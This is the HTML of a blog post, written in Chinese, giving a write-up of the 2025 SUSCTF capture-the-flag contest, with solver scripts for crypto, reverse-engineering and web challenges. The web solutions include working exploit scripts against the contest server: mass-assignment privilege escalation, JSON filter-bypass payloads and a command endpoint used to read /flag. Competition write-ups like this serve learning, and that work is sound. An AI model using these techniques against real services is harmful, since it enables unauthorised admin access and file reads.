@@ -1,0 +1,698 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>2025SUS_WP | PJW&#39;S BLOG</title>
+    <meta name="author" content="PJWaurora" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/PJWaurora.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+<script src="https://s4.zstatic.net/ajax/libs/waline/2.15.8/waline.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/waline/2.15.8/waline.min.css" />
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/waline/2.15.8/waline-meta.min.css" />
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>PJW&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;PJW&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>2025SUS_WP</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/10/6
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF/" style="color: #ff7d73">
+                    CTF
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Writeup/" style="color: #ffa2c4">
+                    Writeup
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
+<li><a href="#Misc">Misc</a></li>
+<li><a href="#Crypto">Crypto</a></li>
+<li><a href="#Web">Web</a></li>
+<li><a href="#Reverse">Reverse</a></li>
+</ol>
+<span id="more"></span>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>  第一次参赛感觉题目都好难，又赶上重感冒，有些分类没做出来，然后就是感觉题目的取舍还是很重要，再一些自己没把握的题目上花费了太多时间<br>  我用到的全部工具列表如下:</p>
+<table>
+<thead>
+<tr>
+<th>工具&#x2F;网站</th>
+<th>类型</th>
+<th>功能介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>VSCode</td>
+<td>编辑器</td>
+<td>代码编辑、调试、插件丰富</td>
+</tr>
+<tr>
+<td>IDA Free</td>
+<td>逆向分析</td>
+<td>静态反汇编、逆向工程基础功能</td>
+</tr>
+<tr>
+<td>Ghidra</td>
+<td>逆向分析</td>
+<td>开源逆向分析平台，支持多种架构</td>
+</tr>
+<tr>
+<td>DIE</td>
+<td>查壳软件</td>
+<td>检测文件壳类型、分析可执行文件</td>
+</tr>
+<tr>
+<td>Pastebin</td>
+<td>网站</td>
+<td>在线文本分享、脚本托管</td>
+</tr>
+<tr>
+<td>Adobe Illustrator</td>
+<td>制图工具</td>
+<td>海报设计</td>
+</tr>
+</tbody></table>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="x-Questionnaire"><a href="#x-Questionnaire" class="headerlink" title="- [x] [Questionnaire]"></a>- [x] [Questionnaire]</h3><p>  没啥好说的，就是个问卷调查，填完抽奖就给flag<br>  <img src="/images/2025SUS/%E9%97%AE%E5%8D%B7%E8%B0%83%E6%9F%A5.png" alt="问卷"><br>  flag: susctf{7hx_4_c0ming_&amp;<em>5ee_ya_n3x7_yr</em>:333}</p>
+<h3 id="x-easyjail"><a href="#x-easyjail" class="headerlink" title="- [x] [easyjail]"></a>- [x] [easyjail]</h3><p>  题目给了一个安全沙箱的源码，脚本是用来给用户创建一个受限的shell环境的</p>
+<p>  这个脚本的功能是给用户创建一个受限的shell环境，用户只能通过url提交bash脚本，并且脚本运行前后会对比文件系统的变化，如果有任何变化就会报错退出。<br>  同时查询run.sh可以发现同目录下应该有一个&#x2F;flag文件：</p>
+<pre><code class="language-bash">  #!/bin/sh
+  if [ -z &quot;$GZCTF_FLAG&quot; ]; then
+    export GZCTF_FLAG=&quot;susctf{testflag}&quot;
+  fi
+
+  echo &quot;$GZCTF_FLAG&quot; &gt;/flag
+  export GZCTF_FLAG=&quot;&quot;
+  echo &quot;Blocked by ctf_xinetd&quot; &gt;/etc/banner_fail
+
+  chmod 444 /flag
+
+  inetd -f
+  sleep infinity
+</code></pre>
+<p>  这个脚本会把环境变量GZCTF_FLAG的值写入&#x2F;flag文件中，并且把&#x2F;flag文件的权限设置为只读<br>  但是脚本运行时并没有限制用户访问环境变量，所以可以通过访问&#x2F;proc&#x2F;self&#x2F;environ来获取环境变量的值<br>  使用pastebin生成相关url<br>  <img src="/images/2025SUS/pastebin.png" alt="pastebin"></p>
+<pre><code class="language-bash">  #!/bin/bash
+ grep &quot;&quot; /fl?g
+</code></pre>
+<p>  <img src="/images/2025SUS/easyjall.png" alt="easyjail"><br>  得到flag:susctf{Pr3l0ad_3scaPe_d0d8557da1cb}</p>
+<h3 id="x-eat-mian"><a href="#x-eat-mian" class="headerlink" title="- [x] [eat_mian]"></a>- [x] [eat_mian]</h3><p>题目要求：</p>
+<ul>
+<li>你的代码会作为头文件插入主程序，所有 <code>int</code> 和 <code>main</code> 都会被替换为 <code>eat</code> 和 <code>mian</code>。</li>
+<li>例如：<pre><code class="language-c">int main(void) {
+  srand(time(NULL));
+  int n = rand();
+  printf(&quot;I int %d cups of main! wwwww\n&quot;, n);
+  return 0;
+}
+</code></pre>
+会被替换为：<pre><code class="language-c">eat mian(void) {
+  srand(time(NULL));
+  eat n = rand();
+  preatf(&quot;I eat %d cups of mian! wwwww\n&quot;, n);
+  return 0;
+}
+</code></pre>
+</li>
+<li>要求输出：<code>I eat &lt;数字&gt; cups of mian! wwwww</code></li>
+<li>注意：提交的代码中不能出现 <code>int</code> 和 <code>main</code> 关键字，否则会被自动替换。</li>
+</ul>
+<p>这题搞过来我还用了Typedef define等神秘办法，然后发现int和main不让出现。注意到printf中的int也会被替换，猜测会不会是用什么字符串检测的方式实现的这种检测提交代码中的文字，以及替换里面的文字，而禁止提交代码出现这个估计整体的文字替换是在整个头文件导入之前的，因为如果在导入之后会发生比如我定义eat为int也会变成eat为eat，不需要那么严格的检测提交代码，所以试着用define定义了一个拼接函数，然后再用拼接函数定义eat为int等等<br><img src="/images/2025SUS/%E5%90%83%E9%9D%A2.png" alt="吃面"><br>提交美美得到flag: susctf{Mag1Cal_P7epr0ces$er_46339ab5}<br><img src="/images/2025SUS/%E5%90%83%E9%9D%A2%E7%BB%93%E6%9E%9C.png" alt="吃面结果"></p>
+<h3 id="x-signin"><a href="#x-signin" class="headerlink" title="-[x] [signin]"></a>-[x] [signin]</h3><p><img src="/images/2025SUS/signin.png" alt="signin"><br>题目给了一个有一堆假flag的post.ai SUS社团海报，恰好电脑有AI打开一看下面藏着一块和背景色融为一体的susctf{SUS_we1c0me5_y0u_:D}，拿出提交正确</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="x-03-CrySignin"><a href="#x-03-CrySignin" class="headerlink" title="- [x] [03-CrySignin]"></a>- [x] [03-CrySignin]</h3><p>这题源码给了个离散对数算法加上一次加密中间的过程量信息以及加密算法，让我们求解密的结果<br>即</p>
+<ul>
+<li>1.题干<br>  给定了大素数 p、q、生成元 g、特殊点 w、多项式系数 f(x)、以及 64 个 $g^{(a_i)}$ 的值。<br>  给定了加密结果 $H &#x3D; g^{(f(a)&#x2F;(a-w))}$。<br>  求密文</li>
+<li>2.多项式除法<br>用多项式除法将 $f(x)$ 除以 $(x-w)$，得到商多项式 $Q(x)$ 和余数 $f(w)$。<br>计算 $Q(a)$，即将 $a$ 代入商多项式。</li>
+<li>3.计算 $g^{Q(a)}$<br>用泄露的 64 个 $g^{(a_i)}$，根据 $Q(a)$ 的每一项系数，累乘得到 $g^{Q(a)}$。</li>
+<li>4.还原 $g^{1&#x2F;(a-w)}$<br>利用加密结果 $H &#x3D; g^{f(a)&#x2F;(a-w)}$ 和已算出的 $g^{Q(a)}$，$T &#x3D; g^{f(w)&#x2F;(a-w)}$。</li>
+<li>5.求逆元和最终 flag<br>计算 $f(w)$ 在模 $q$ 下的逆元 $fwinv$。<br>得到 $g^{1&#x2F;(a-w)} &#x3D; T^{fwinv} \mod p$。<br>这就是题目中用于生成 flag 的 ANS。</li>
+<li>6.格式化输出<br>取 ANS 的低 128 位，转为 UUID 格式，得到最终 flag<br>编写脚本如下(具体数值不填了)</li>
+</ul>
+<pre><code class="language-python">
+  n = 64
+  q_coeffs = [0] * (n-1)
+  q_coeffs[n-2] = f_coeffs[n-1]
+  for i in range(n-2, 0, -1):
+      q_coeffs[i-1] = (f_coeffs[i] + w * q_coeffs[i]) % q
+  r = (f_coeffs[0] + w * q_coeffs[0]) % q
+  g_Qa = 1
+  for i in range(n-1):
+      g_Qa = (g_Qa * pow(g_a_i[i], q_coeffs[i], p)) % p
+  T = (H * pow(g_Qa, p-2, p)) % p
+  fwinv = inverse(r, q)
+  ANS = pow(T, fwinv, p)
+  flag_int = ANS % (2**128)
+  print(&quot;susctf{&quot; + str(UUID(int=flag_int)) + &quot;}&quot;)
+</code></pre>
+<p>得到答案 susctf{a5c34a39-0c72-3c4f-8c74-fd1627fc9284}，验证正确</p>
+<h3 id="x-04-Broadcast-1"><a href="#x-04-Broadcast-1" class="headerlink" title="-[x] [04-Broadcast_1]"></a>-[x] [04-Broadcast_1]</h3><p>整个代码就是用一个随机满秩的矩阵A，然后生成flag+一个随机数的合起来长度128位的秘密向量s,最后让用户接受到一个$ AS+e $的密文y<br>e是一个离散高斯分布采样得到的均值近似为0的噪声，所以多次取y之后可以获得一个$ A S\approx y $<br>而A满秩可以得到 $S&#x3D;\frac{1}{A}y$</p>
+<p>编写脚本</p>
+<pre><code class="language-python">import socket
+import time
+import random as random2
+import numpy as np
+
+def modinv(a, p):
+    g, x, _ = extended_gcd(a, p)
+    return x % p if g == 1 else None
+
+def extended_gcd(a, b):
+    if a == 0:
+        return b, 0, 1
+    g, y, x = extended_gcd(b % a, a)
+    return g, x - (b // a) * y, y
+
+def matrix_mod_inverse(matrix, p):
+    n = matrix.shape[0]
+    aug = np.hstack((matrix, np.eye(n, dtype=int)))
+    for i in range(n):
+        for j in range(i, n):
+            if aug[j, i] != 0:
+                aug[[i, j]] = aug[[j, i]]
+                break
+        else:
+            return None
+        inv = modinv(aug[i, i], p)
+        if inv is None:
+            return None
+        aug[i] = (aug[i] * inv) % p
+        for j in range(n):
+            if j != i and aug[j, i] != 0:
+                aug[j] = (aug[j] - aug[j, i] * aug[i]) % p
+    return aug[:, n:]
+
+def get_flag_char(s_i):
+    for k in range((s_i - 126 + 199) // 200, (s_i - 32) // 200 + 1):
+        t_i = 200 * k
+        ord_char = s_i - t_i
+        if 32 &lt;= ord_char &lt;= 126 and 200 &lt;= t_i &lt;= 31137:
+            return chr(ord_char)
+    return &quot;?&quot;
+
+def main():
+    HOST, PORT, n, p, NUM_Y = &quot;106.14.191.23&quot;, 57766, 128, 31337, 200
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+        seedA = s.recv(1024).decode().split(&quot;Public Seed:&quot;)[1].strip()
+
+        rng = random2.Random()
+        rng.seed(seedA.encode())
+        while True:
+            A = np.array([[rng.randint(0, 99) for _ in range(n)] for _ in range(n)], dtype=int) % p
+            if np.linalg.matrix_rank(A) == n:
+                break
+
+        y_list = []
+        for _ in range(NUM_Y):
+            try:
+                s.sendall(b&quot;1\n&quot;)
+                time.sleep(0.1)
+                y = eval(s.recv(4096).decode().strip())
+                if len(y) == n:
+                    y_list.append([yi % p for yi in y])
+            except:
+                continue
+        s.sendall(b&quot;2\n&quot;)
+
+    c = np.round(np.mean(np.array(y_list, dtype=int), axis=0)).astype(int) % p
+
+    A_inv = matrix_mod_inverse(A, p)
+    if A_inv is None:
+        return
+    s_list = (np.dot(A_inv, c) % p).astype(int).tolist()
+
+    flag = &quot;&quot;.join(map(get_flag_char, s_list))
+    print(flag)
+    if &quot;{&quot; in flag and &quot;}&quot; in flag:
+        print(flag[flag.index(&quot;{&quot;):flag.index(&quot;}&quot;)+1])
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p><img src="/images/2025SUS/%E5%B9%BF%E6%92%AD%E7%BB%93%E6%9E%9C.png" alt="广播结果"><br>得到结果susctf{693b5564-3b86-4e11-9f74-a8e67cb82b9a}</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="x-am-i-admin"><a href="#x-am-i-admin" class="headerlink" title="-[x] [am i admin?]"></a>-[x] [am i admin?]</h3><p>题目下载过来查看了一些auth.go</p>
+<pre><code class="language-go">func (a *Auth) RegisterHandler(w http.ResponseWriter, r *http.Request) {
+	var c UserCreds
+	json.NewDecoder(r.Body).Decode(&amp;c)
+	if c.Username == &quot;&quot; || c.Password == &quot;&quot; {
+		http.Error(w, &quot;username and password required&quot;, http.StatusBadRequest)
+		return
+	}
+	if c.Username == &quot;admin&quot; {
+		http.Error(w, &quot;cannot register as admin&quot;, http.StatusForbidden)
+		return
+	}
+	a.UserDB.Lock()
+	defer a.UserDB.Unlock()
+	if _, exists := a.UserDB.users[c.Username]; exists {
+		http.Error(w, &quot;username already exists&quot;, http.StatusConflict)
+		return
+	}
+	a.UserDB.users[c.Username] = c
+	w.Write([]byte(&quot;register success&quot;))
+}
+</code></pre>
+<p>这里发现是有一个admin用户的，但是不能注册为叫做admin的用户，那该怎么办？ 继续往下看看到login函数发现数据库里有一个变量叫做<br><strong>user.IsAdmin &#x3D; true</strong></p>
+<pre><code class="language-go">func (a *Auth) LoginHandler(w http.ResponseWriter, r *http.Request) {
+	var c UserCreds
+	json.NewDecoder(r.Body).Decode(&amp;c)
+	a.UserDB.Lock()
+	user, ok := a.UserDB.users[c.Username]
+	a.UserDB.Unlock()
+	if ok &amp;&amp; user.Password == c.Password {
+		if user.Username == &quot;admin&quot; &amp;&amp; user.Password == a.AdminPassword {
+			user.IsAdmin = true
+		}
+		sessionID := GenRandomSeq(32)
+		a.Store.Lock()
+		a.Store.sessions[sessionID] = user
+		a.Store.Unlock()
+		http.SetCookie(w, &amp;http.Cookie{Name: &quot;session_id&quot;, Value: sessionID, Path: &quot;/&quot;})
+		fmt.Fprintf(w, &quot;user %s logged in&quot;, user.Username)
+		return
+	}
+	http.Error(w, &quot;invalid credentials&quot;, http.StatusUnauthorized)
+}
+</code></pre>
+<p>这个变量为true则为管理员，而之前的注册函数里又没有限制我给不给这个数据库里的数据，于是编写相关脚本如下</p>
+<pre><code class="language-python">import requests
+
+BASE_URL = &quot;http://106.14.191.23:54009&quot;
+s = requests.Session()
+
+# 注册并登录
+s.post(f&quot;{BASE_URL}/register&quot;, json={&quot;username&quot;: &quot;PJW&quot;, &quot;password&quot;: &quot;PJW&quot;, &quot;IsAdmin&quot;: True})
+s.post(f&quot;{BASE_URL}/login&quot;, json={&quot;username&quot;: &quot;PJW&quot;, &quot;password&quot;: &quot;PJW&quot;})
+
+# 读取 flag
+r = s.post(f&quot;{BASE_URL}/run&quot;, json={&quot;cmd&quot;: &quot;cat&quot;, &quot;args&quot;: [&quot;/flag&quot;]})
+print(r.json().get(&quot;output&quot;, &quot;&quot;))
+</code></pre>
+<p><img src="/images/2025SUS/admin1.png" alt="admin1"><br>运行脚本得到flag: susctf{Unwr17teN_Js0n_K3y_e10e1ddc62c4}，验证正确</p>
+<h3 id="x-am-i-admin-2"><a href="#x-am-i-admin-2" class="headerlink" title="-[x] [am i admin?2]"></a>-[x] [am i admin?2]</h3><p>附件下载发现与上一题几乎一样，加了一个数据库注册时禁止上传user.IsAdmin数据</p>
+<pre><code class="language-go">func (a *Auth) RegisterHandler(w http.ResponseWriter, r *http.Request) {
+	body, _ := io.ReadAll(r.Body)
+	bodyStr := string(body)
+	if strings.Contains(bodyStr, &quot;IsAdmin&quot;) {
+		http.Error(w, &quot;not allowed!&quot;, http.StatusForbidden)
+		return
+	}
+
+	// 下略
+}
+</code></pre>
+<p>但是发现他用的其实是个字符串来判定你是不是做了坏事，我们把字符串用多种方法转义等可以发现又能够登录进去<br>于是编写脚本如下看看哪种方法能够逃过该方法的检测</p>
+<pre><code class="language-python">import requests
+
+TARGET = &quot;http://106.14.191.23:50630&quot;
+
+def exploit():
+    print(&quot;开始尝试绕过...&quot;)
+
+    bypass_methods = [
+        {&quot;IsAdm\u0069n&quot;: True},
+        {&quot;isadmin&quot;: True},
+        {&quot;IsAdmin&quot;: True},
+        {&quot;IsAdmin &quot;: True},
+        {&quot;IsAdmin&quot;: False, &quot;IsAdmin&quot;: True},
+    ]
+
+    for i, payload in enumerate(bypass_methods):
+        username = f&quot;hacker{i}&quot;
+        password = &quot;p@ssw0rd&quot;
+        print(f&quot;方法{i+1}注册...&quot;)
+
+        reg_data = {&quot;username&quot;: username, &quot;password&quot;: password}
+        reg_data.update(payload)
+        r = requests.post(f&quot;{TARGET}/register&quot;, json=reg_data)
+        print(f&quot;注册: {r.status_code} - {r.text}&quot;)
+
+        if r.status_code == 200:
+            l = requests.post(f&quot;{TARGET}/login&quot;, json={&quot;username&quot;: username, &quot;password&quot;: password})
+            print(f&quot;登录: {l.status_code} - {l.text}&quot;)
+
+            if l.status_code == 200:
+                c = l.cookies
+                cmd = requests.post(f&quot;{TARGET}/run&quot;, json={&quot;cmd&quot;: &quot;cat&quot;, &quot;args&quot;: [&quot;/flag&quot;]}, cookies=c)
+                print(f&quot;命令结果: {cmd.status_code} - {cmd.text}&quot;)
+
+                if cmd.status_code == 200:
+                    print(&quot;🎉 找到FLAG！&quot;)
+                    return True
+    return False
+
+if __name__ == &quot;__main__&quot;:
+    exploit()
+</code></pre>
+<p><img src="/images/2025SUS/admin2.png" alt="admin2"><br>用大小写混淆成功躲过了检测，成为了管理员<br>然后直接cat flag找到flag:susctf{Ar3_U_1n5eNsi7ive_3n0ugh_ad6c3f186c22},提交正确</p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>本次花了大时间看汇编结果最后就做出来两道，不过熟悉了几个软件的使用还是很有收获的</p>
+<h3 id="x-android-native"><a href="#x-android-native" class="headerlink" title="-[x][android-native]"></a>-[x][android-native]</h3><p>一道安卓逆向题<br><img src="/images/2025SUS/%E5%AE%89%E5%8D%93DIE.png" alt="DIE"><br>DIE查包发现没有被打包，直接改后缀为zip解压开之后用IDA打开内部的libctf_re.so，<br><img src="/images/2025SUS/%E5%AE%89%E5%8D%93IDA.png" alt="IDA"></p>
+<p>查看初始函数之后发现这个就是一个标准的 RC4加密，留了一个心眼发现密钥在初始化之后是会被进行一个操作<br><img src="/images/2025SUS/%E5%AE%89%E5%8D%93%E5%B0%8F%E5%A6%99%E6%8B%9B.png" alt="手脚"><br>获取 密钥密文如下<br><img src="/images/2025SUS/%E5%AE%89%E5%8D%93%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87.png" alt="安卓key"><br>编写解密脚本</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+
+def apply_xor_transform():
+    &quot;&quot;&quot;应用XOR变换到密钥上，对应sub_950()函数中的操作&quot;&quot;&quot;
+    key = list(b&#39;1m1r6rqro1l~dr&#39;)
+    xor_vals = [0, 1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 1]
+    for i in range(1, len(xor_vals)):
+        key[i] ^= xor_vals[i]
+    return bytes(key)
+
+def rc4_crypt(key, data):
+    &quot;&quot;&quot;RC4加解密（加密和解密使用相同的算法）&quot;&quot;&quot;
+    S = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) % 256
+        S[i], S[j] = S[j], S[i]
+    i = j = 0
+    out = bytearray()
+    for byte in data:
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        k = S[(S[i] + S[j]) % 256]
+        out.append(byte ^ k)
+    return bytes(out)
+
+def main():
+    expected_ciphertext = bytes([
+        0x00, 0x7F, 0xD6, 0xE8, 0xE9, 0x17, 0xD1, 0x59, 
+        0x76, 0xB1, 0x19, 0xA0, 0x57, 0x38, 0x27, 0x28, 
+        0x0F, 0x9A, 0x10, 0xF6, 0xD2, 0x75, 0x52, 0x83, 
+        0x97, 0x66, 0x4C, 0xF7, 0x3D, 0x9B, 0x8F, 0x85, 
+        0x4A, 0xD7, 0x08, 0xF4, 0x6D, 0xE7, 0xA9, 0x1D, 
+        0xB8, 0x9C, 0x0F, 0x8A
+    ])
+    print(&quot;=== RC4解密分析 ===&quot;)
+    original_key = b&#39;1m1r6rqro1l~dr&#39;
+    print(f&quot;原始密钥: {original_key.decode()}&quot;)
+    print(f&quot;原始密钥(hex): {original_key.hex()}&quot;)
+
+    transformed_key = apply_xor_transform()
+    print(f&quot;\n变换后密钥: {transformed_key}&quot;)
+    print(f&quot;变换后密钥(hex): {transformed_key.hex()}&quot;)
+    print(f&quot;变换后密钥(ASCII): {transformed_key.decode(&#39;ascii&#39;, errors=&#39;replace&#39;)}&quot;)
+
+    plaintext = rc4_crypt(transformed_key, expected_ciphertext)
+    print(f&quot;\n解密结果(原始字节): {plaintext}&quot;)
+    print(f&quot;解密结果(hex): {plaintext.hex()}&quot;)
+
+    for encoding in [&#39;ascii&#39;, &#39;utf-8&#39;, &#39;latin-1&#39;]:
+        try:
+            print(f&quot;解密结果({encoding}): {plaintext.decode(encoding, errors=&#39;replace&#39;)}&quot;)
+            break
+        except Exception:
+            continue
+
+    print(f&quot;\n=== 验证 ===&quot;)
+    verification = rc4_crypt(transformed_key, plaintext)
+    print(f&quot;重新加密结果 == 预期密文: {verification == expected_ciphertext}&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p><img src="/images/2025SUS/%E5%AE%89%E5%8D%93%E8%A7%A3%E5%AF%86.png" alt="安卓解密"><br>得到flag: susctf{de094624-8f5b-44dc-810c-58132a2b5ea3}</p>
+<blockquote>
+<p>变换后密钥: b’1l0v3susf0ever’</p>
+</blockquote>
+<h3 id="x-ezsignin"><a href="#x-ezsignin" class="headerlink" title="-[x][ezsignin]"></a>-[x][ezsignin]</h3><p>用DIE打开发现是个ELF<br><img src="/images/2025SUS/1DIE.png" alt="1DIE"><br>用IDA打开查了个字符串，然后读了点汇编之后发现，这应该是一个走迷宫函数<br><img src="/images/2025SUS/1IDA%E6%B1%87%E7%BC%96.png" alt="1IDA汇编"><br><img src="/images/2025SUS/1IDA%E5%AD%97%E7%AC%A6%E4%B8%B2.png" alt="1IDA字符串"><br>注意到这2，4选择中有计步器+-6出现，怀疑这是一个6个为一列的迷宫,从E开始走到O，还原迷宫得到</p>
+<pre><code>E11100
+000100
+000100
+011100
+010000
+01111O
+</code></pre>
+<p>得到1是向右走一步，2是向下走一步， 3是向左走一步，4是向上走一步，得出走迷宫序列<strong>11122233221111</strong></p>
+<p><img src="/images/2025SUS/1%E8%BF%B7%E5%AE%ABWIN.png" alt="1迷宫WIN"><br>成功进入，发现还要Flag</p>
+<p>找相关代码找吐了，发现晦涩难懂，转头启动ghidra<br><img src="/images/2025SUS/1GHIDRA.png" alt="1GHIDRA"><br>慢慢读汇编，最后中心集中在这几块代码<br><img src="/images/2025SUS/1%E5%8A%A0%E5%AF%86.png" alt="1加密"><br>发现它是按照你走迷宫的顺序进行一个密文的加密，而要做的就是用这个顺序一步步推回去</p>
+<p>编写脚本</p>
+<pre><code class="language-python">import base58
+from Crypto.Cipher import ARC4
+
+target = &quot;2wHFw6XRQFJexwYcizWFJVU87GnPPbuRZF99t8884SxTe RptgvAmfzdqmE9skCSRbEMUc8r5WcGQ4aq8gJQ2fpUQgiiNvkEQXL4GoQ5rBZfejYFtEpTA5x1kybteneAuECqp3uLCDnuU4GwD1kKet8Bmqb4eidPWEcr6bSNNU3wr5xxtHpc43TyHMSKggBRZr&quot; #先前在加密函数下的验证函数中找到的静态密文，根据验证函数设定取前0xc1位
+data = target.encode()
+for step in &quot;11122233221111&quot;[::-1]: # 迷宫倒序
+    if step == &#39;1&#39;:
+        data = bytes(b ^ 0x66 for b in data)  #1是选择的是一个全体异或函数
+    elif step == &#39;2&#39;:
+        data = base58.b58decode(data.decode(&#39;latin-1&#39;)) #2是一个base58加密函数
+    elif step == &#39;3&#39;:
+        data = ARC4.new(b&quot;YourKey&quot;).decrypt(data) #3是一个ARC4对称加密函数
+    print(data.decode())
+</code></pre>
+<p><img src="/images/2025SUS/1%E8%A7%A3%E5%AF%86%E7%BB%93%E6%9E%9C.png" alt="1解密结果"></p>
+<p>运行得到结果susctf{Oh_My_G0d_You_@re_Rev3rse_God!!!}<br><img src="/images/2025SUS/1%E9%AA%8C%E8%AF%81flag.png" alt="1验证flag"><br>验证成功</p>
+
+    </div>
+    
+    
+    
+    
+    
+    <div id="comment">
+        <div id="waline-container"></div>
+    </div>
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
